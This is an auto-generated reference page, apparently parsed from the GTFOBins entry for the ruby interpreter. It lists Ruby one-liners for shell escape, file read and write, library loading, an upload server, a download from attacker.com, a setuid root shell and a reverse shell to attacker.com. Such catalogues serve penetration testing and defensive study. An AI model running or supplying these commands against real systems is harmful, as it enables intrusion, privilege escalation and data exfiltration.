---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# ruby

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `ruby` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ruby` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [ruby](../../tools/linux/ruby.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | ruby |
| name | ruby |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/ruby/ |

## Preserved Source Material

```yaml
_body: ''
_name: ruby
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ruby
functions:
  download:
  - code: ruby -e 'require "open-uri"; download = URI.open("http://attacker.com/path/to/input-file"); IO.copy_stream(download,
      "/path/to/output-file")'
    contexts:
      sudo: null
      unprivileged: null
    sender: http-server
  file-read:
  - code: ruby -e 'puts File.read("/path/to/input-file")'
    contexts:
      sudo: null
      unprivileged: null
  file-write:
  - code: ruby -e 'File.open("/path/to/output-file", "w+") { |f| f.write("DATA") }'
    contexts:
      sudo: null
      unprivileged: null
  library-load:
  - code: ruby -e 'require "fiddle"; Fiddle.dlopen("/path/to/lib.so")'
    contexts:
      sudo: null
      unprivileged: null
  reverse-shell:
  - code: ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print
      io.read}end'
    contexts:
      sudo: null
      unprivileged: null
    listener: tcp-server
  shell:
  - code: ruby -e 'exec "/bin/sh"'
    contexts:
      capabilities:
        code: ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
        list:
        - CAP_SETUID
      sudo: null
      unprivileged: null
  upload:
  - code: ruby -run -e httpd . -p 80
    contexts:
      sudo: null
      unprivileged: null
    receiver: http-client
    version: '>= 1.9.2'
```
